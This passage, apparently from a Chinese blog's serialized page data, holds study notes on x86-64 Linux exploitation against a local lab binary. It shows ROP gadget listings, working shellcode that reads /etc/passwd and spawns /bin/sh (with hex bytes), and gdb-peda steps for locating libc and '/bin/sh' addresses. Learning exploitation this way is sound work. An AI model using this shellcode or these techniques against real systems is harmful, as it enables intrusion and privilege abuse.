jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;\n0x00000000000007f3 : pop rdi ; ret\n</code></pre><h2 id=\"shellcode编写\"><a href=\"#shellcode编写\" class=\"headerlink\" title=\"shellcode编写\"></a>shellcode编写</h2><p>读取/etc/passwd</p>\n<pre><code>BITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db &quot;/etc/passwdA&quot;\n</code></pre><pre><code>$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#39;\\x&#39;$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41\n</code></pre><p>execve /bin/sh</p>\n<pre><code>.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n</code></pre><pre><code class=\"\\\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep &quot;^ &quot; | cut -f2); do echo -n &#39;\\x&#39;$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n</code></pre>\n<h2 id=\"retn和leave和call\"><a href=\"#retn和leave和call\" class=\"headerlink\" title=\"retn和leave和call\"></a>retn和leave和call</h2><p>retn: </p>\n<blockquote>\n<p>64位: pop rip;  rsp = rsp + 8</p>\n<p>32位: pop eip; esp = esp + 4</p>\n<p>retn N操作：先eip=[esp]，然后esp=esp+4+N</p>\n</blockquote>\n<p>leave:</p>\n<blockquote>\n<p>64位: move rsp rbp; pop rbp               将rbp中的值传给rsp</p>\n<p>32位: move esp ebp; pop ebp             将ebp中的值传给esp</p>\n</blockquote>\n<p>call:</p>\n<blockquote>\n<p>64位: push rip; jump 目的位置</p>\n<p>32位: push eip; jump 目的位置</p>\n</blockquote>\n<h2 id=\"32位寻找偏移\"><a href=\"#32位寻找偏移\" class=\"headerlink\" title=\"32位寻找偏移\"></a>32位寻找偏移</h2><blockquote>\n<p>pattern_create 50</p>\n<p>pattern_offset 字符串</p>\n</blockquote>\n<h2 id=\"有符号整数比较和无符号整数比较\"><a href=\"#有符号整数比较和无符号整数比较\" class=\"headerlink\" title=\"有符号整数比较和无符号整数比较\"></a>有符号整数比较和无符号整数比较</h2><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>含义</th>\n<th>运算符号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>jbe</td>\n<td>unsigned below or equal (lower or same)</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jae</td>\n<td>unsigned above or equal (higher or same)</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jb</td>\n<td>unsigned below (lower)</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>ja</td>\n<td>unsigned above (higher)</td>\n<td>&gt;</td>\n</tr>\n<tr>\n<td>jle</td>\n<td>signed less or equal</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jge</td>\n<td>signed greater or equal</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jl</td>\n<td>signed less than</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>jg</td>\n<td>signed greater than</td>\n<td>&gt;</td>\n</tr>\n</tbody>\n</table>\n<p>从上面的表中可以看出，</p>\n<p>对于无符号（unsigned）整数比较，使用的是单词是above或below；<br>对于有符号(signed)整数比较，则使用的单词是greater或less。</p>\n<h2 id=\"查找argv-0-变量的地址\"><a href=\"#查找argv-0-变量的地址\" class=\"headerlink\" title=\"查找argv[0]变量的地址\"></a>查找argv[0]变量的地址</h2><pre><code>gdb-peda$ find /home\nSearching for &#39;/home&#39; in: None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\n[stack] : 0x7fffffffe8f4 (&quot;/home/tianji/Desktop/pwn/jarvis&quot;)\n[stack] : 0x7fffffffeb12 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes&quot;)\n[stack] : 0x7fffffffeb48 (&quot;/home/tianji&quot;)\n[stack] : 0x7fffffffeee7 (&quot;/home/tianji/.vimpkg/bin&quot;)\n[stack] : 0x7fffffffefc8 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\ngdb-peda$ find 0x7fffffffdff6\nSearching for &#39;0x7fffffffdff6&#39; in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\n[stack] : 0x7fffffffdc68 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n</code></pre><p>首先搜索字符串”/home”,第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。</p>\n<p>当前$rsp的值就是 存在栈溢出变量的地址</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h2><p>32位和64位程序的区别, 更多的是体现在<a href=\"https://en.wikipedia.org/wiki/X86_calling_conventions\" target=\"_blank\" rel=\"noopener\">调用约定(Calling Convention)</a>上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.</p>\n<p>本文主要是介绍Linux平台下的漏洞利用, 所以就专注于<code>System V AMD64 ABI</code> 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.</p>\n<pre><code>$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep &quot;&lt;main&gt;:&quot; -A 11\n00000000000006a0 &lt;main&gt;:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 &lt;foo&gt;\n</code></pre><h2 id=\"查找libc基地址\"><a href=\"#查找libc基地址\" class=\"headerlink\" title=\"查找libc基地址\"></a>查找libc基地址</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n    linux-vdso.so.1 (0x00007ffff7ffa000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n</code></pre><p>方法二:</p>\n<p>首先查找libc中某一函数的偏移，以system为例:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n</code></pre><p>或者使用ida也可以查找函数的偏移。</p>\n<p>寻找system的绝对地址：</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {&lt;text variable, no debug info&gt;} 0x5d0 &lt;system@plt&gt;\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 &lt;__libc_system&gt;\n</code></pre><p>然后就可以计算libc的基地址:</p>\n<blockquote>\n<p> 0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000</p>\n</blockquote>\n<h2 id=\"查找”-bin-sh”的偏移地址\"><a href=\"#查找”-bin-sh”的偏移地址\" class=\"headerlink\" title=\"查找”/bin/sh”的偏移地址\"></a>查找”/bin/sh”的偏移地址</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n</code></pre><p>方法二:</p>\n<p>在ida中查找。</p>\n<p>方法三:</p>\n<p>在环境变量中查找。</p>\n<pre><code class=\"shell\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (&lt;main&gt;:    push   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRDX: 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (&quot;CLUTTER_IM_MODULE=xim&quot;)\nRSI: 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\nRDI: 0x1 \nRBP: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRSP: 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\nRIP: 0x555555554739 (&lt;main&gt;:    push   rbp)\nR8 : 0x7ffff7dd0d80 --&gt; 0x0 \nR9 : 0x7ffff7dd0d80 --&gt; 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffdde0 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a &lt;shell+16&gt;:    call   0x5555555545d0 &lt;system@plt&gt;\n   0x55555555472f &lt;shell+21&gt;:    mov    edi,0x0\n   0x555555554734 &lt;shell+26&gt;:    call   0x5555555545f0 &lt;exit@plt&gt;\n=&gt; 0x555555554739 &lt;main&gt;:    push   rbp\n   0x55555555473a &lt;main+1&gt;:    mov    rbp,rsp\n   0x55555555473d &lt;main+4&gt;:    sub    rsp,0x120\n   0x555555554744 &lt;main+11&gt;:    mov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a &lt;main+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd10 --&gt; 0x1 \n0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd20 --&gt; 0x100008000 \n0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd30 --&gt; 0x0 \n0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17    int main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd10 --&gt; 0x1 \n0016| 0x7fffffffdd18 --&gt; 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd20 --&gt; 0x100008000 \n0032| 0x7fffffffdd28 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd30 --&gt; 0x0 \n0048| 0x7fffffffdd38 --&gt; 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0064| 0x7fffffffdd48 --&gt; 0x7fffffffdde0 --&gt; 0x1 \n0072| 0x7fffffffdd50 --&gt; 0x0 \n0080| 0x7fffffffdd58 --&gt; 0x0 \n0088| 0x7fffffffdd60 --&gt; 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --&gt; 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --&gt; 0x7fff00000000 \n0112| 0x7fffffffdd78 --&gt; 0x0 \n0120| 0x7fffffffdd80 --&gt; 0x0 \n0128| 0x7fffffffdd88 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:    add    r14,0x8)\n0136| 0x7fffffffdd90 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 \n0144| 0x7fffffffdd98 --&gt; 0x2225ab63 \n0152| 0x7fffffffdda0 --&gt; 0x0 \n0160| 0x7fffffffdda8 --&gt; 0x0 \n0168| 0x7fffffffddb0 --&gt; 0x0 \n0176| 0x7fffffffddb8 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0184| 0x7fffffffddc0 --&gt; 0x7fffffffdde0 --&gt; 0x1 \n0192| 0x7fffffffddc8 --&gt; 0x55555555463a (&lt;_start+42&gt;:    hlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --&gt; 0x7fffffffddd8 --&gt; 0x1c \n0208| 0x7fffffffddd8 --&gt; 0x1c \n0216| 0x7fffffffdde0 --&gt; 0x1 \n0224| 0x7fffffffdde8 --&gt; 0x7fffffffe199 (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0232| 0x7fffffffddf0 --&gt; 0x0 \n0240| 0x7fffffffddf8 --&gt; 0x7fffffffe1c7 (&quot;CLUTTER_IM_MODULE=xim&quot;)\n0248| 0x7fffffffde00 --&gt; 0x7fffffffe1dd (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)\n0256| 0x7fffffffde08 --&gt; 0x7fffffffe7c9 (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)\n0264| 0x7fffffffde10 --&gt; 0x7fffffffe7e4 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)\n0272| 0x7fffffffde18 --&gt; 0x7fffffffe806 (&quot;LC_PAPER=zh_CN.UTF-8&quot;)\n0280| 0x7fffffffde20 --&gt; 0x7fffffffe81b (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)\n0288| 0x7fffffffde28 --&gt; 0x7fffffffe833 (&quot;XDG_MENU_PREFIX=gnome-&quot;)\n0296| 0x7fffffffde30 --&gt; 0x7fffffffe84a (&quot;_=/usr/bin/gdb&quot;)\n0304| 0x7fffffffde38 --&gt; 0x7fffffffe859 (&quot;LANG=en_US.UTF-8&quot;)\n0312| 0x7fffffffde40 --&gt; 0x7fffffffe86a (&quot;DISPLAY=:0&quot;)\n0320| 0x7fffffffde48 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)\n0328| 0x7fffffffde50 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)\n0336| 0x7fffffffde58 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)\n0344| 0x7fffffffde60 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)\n0352| 0x7fffffffde68 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)\n0360| 0x7fffffffde70 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)\n0368| 0x7fffffffde78 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)\n0376| 0x7fffffffde80 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)\n0384| 0x7fffffffde88 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)\n0392| 0x7fffffffde90 --&gt; 0x7fffffffe96b (&quot;USER=tianji&quot;)\n--More--(50/100)\n0400| 0x7fffffffde98 --&gt; 0x7fffffffe977 (&quot;DESKTOP_SESSION=ubuntu&quot;)\n0408| 0x7fffffffdea0 --&gt; 0x7fffffffe98e (&quot;QT4_IM_MODULE=fcitx&quot;)\n0416| 0x7fffffffdea8 --&gt; 0x7fffffffe9a2 (&quot;TEXTDOMAINDIR=/usr/share/locale/&quot;)\n0424| 0x7fffffffdeb0 --&gt; 0x7fffffffe9c3 (&quot;GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa&quot;)\n0432| 0x7fffffffdeb8 --&gt; 0x7fffffffea19 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)\n0440| 0x7fffffffdec0 --&gt; 0x7fffffffea4c (&quot;PWD=/home/tianji/Desktop/sploit/bypassaslr_1&quot;)\n0448| 0x7fffffffdec8 --&gt; 0x7fffffffea79 (&quot;LINES=24&quot;)\n0456| 0x7fffffffded0 --&gt; 0x7fffffffea82 (&quot;HOME=/home/tianji&quot;)\n0464| 0x7fffffffded8 --&gt; 0x7fffffffea94 (&quot;TEXTDOMAIN=im-config&quot;)\n0472| 0x7fffffffdee0 --&gt; 0x7fffffffeaa9 (&quot;SSH_AGENT_PID=1606&quot;)\n0480| 0x7fffffffdee8 --&gt; 0x7fffffffeabc (&quot;QT_ACCESSIBILITY=1&quot;)\n0488| 0x7fffffffdef0 --&gt; 0x7fffffffeacf (&quot;XDG_SESSION_TYPE=x11&quot;)\n0496| 0x7fffffffdef8 --&gt; 0x7fffffffeae4 (&quot;XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop&quot;)\n0504| 0x7fffffffdf00 --&gt; 0x7fffffffeb37 (&quot;XDG_SESSION_DESKTOP=ubuntu&quot;)\n0512| 0x7fffffffdf08 --&gt; 0x7fffffffeb52 (&quot;LC_ADDRESS=zh_CN.UTF-8&quot;)\n0520| 0x7fffffffdf10 --&gt; 0x7fffffffeb69 (&quot;GJS_DEBUG_OUTPUT=stderr&quot;)\n0528| 0x7fffffffdf18 --&gt; 0x7fffffffeb81 (&quot;LC_NUMERIC=zh_CN.UTF-8&quot;)\n0536| 0x7fffffffdf20 --&gt; 0x7fffffffeb98 (&quot;ALL_PROXY=socks://127.0.0.1:1080/&quot;)\n0544| 0x7fffffffdf28 --&gt; 0x7fffffffebba (&quot;no_proxy=localhost,127.0.0.0/8,::1&quot;)\n0552| 0x7fffffffdf30 --&gt; 0x7fffffffebdd (&quot;GTK_MODULES=gail:atk-bridge&quot;)\n0560| 0x7fffffffdf38 --&gt; 0x7fffffffebf9 (&quot;NO_PROXY=localhost,127.0.0.0/8,::1&quot;)\n0568| 0x7fffffffdf40 --&gt; 0x7fffffffec1c (&quot;COLUMNS=79&quot;)\n0576| 0x7fffffffdf48 --&gt; 0x7fffffffec27 (&quot;WINDOWPATH=1&quot;)\n0584| 0x7fffffffdf50 --&gt; 0x7fffffffec34 (&quot;SHELL=/bin/bash&quot;)\n0592| 0x7fffffffdf58 --&gt; 0x7fffffffec44 (&quot;VTE_VERSION=5201&quot;)\n</code></pre>\n<p>我们可以看到“SHELL=/bin/bash”的地址:<code>0x7fffffffec34</code>,然后去掉<code>SHELL</code>,这样“/bin/bash”的地址就是<code>0x7fffffffec3a</code></p>\n<pre><code>gdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:    &quot;/bin/bash&quot;\n</code></pre><p>当然，我这里是”/bin/bash”,所以这方法不可行。这时候，可以添加环境变量。</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (&lt;main&gt;:    push   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRDX: 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)\nRSI: 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\nRDI: 0x1 \nRBP: 0x555555554790 (&lt;__libc_csu_init&gt;:    push   r15)\nRSP: 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\nRIP: 0x555555554739 (&lt;main&gt;:    push   rbp)\nR8 : 0x7ffff7dd0d80 --&gt; 0x0 \nR9 : 0x7ffff7dd0d80 --&gt; 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffddd0 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a &lt;shell+16&gt;:    call   0x5555555545d0 &lt;system@plt&gt;\n   0x55555555472f &lt;shell+21&gt;:    mov    edi,0x0\n   0x555555554734 &lt;shell+26&gt;:    call   0x5555555545f0 &lt;exit@plt&gt;\n=&gt; 0x555555554739 &lt;main&gt;:    push   rbp\n   0x55555555473a &lt;main+1&gt;:    mov    rbp,rsp\n   0x55555555473d &lt;main+4&gt;:    sub    rsp,0x120\n   0x555555554744 &lt;main+11&gt;:    mov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a &lt;main+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd00 --&gt; 0x1 \n0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd10 --&gt; 0x100008000 \n0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd20 --&gt; 0x0 \n0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17    int main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)\n0008| 0x7fffffffdd00 --&gt; 0x1 \n0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 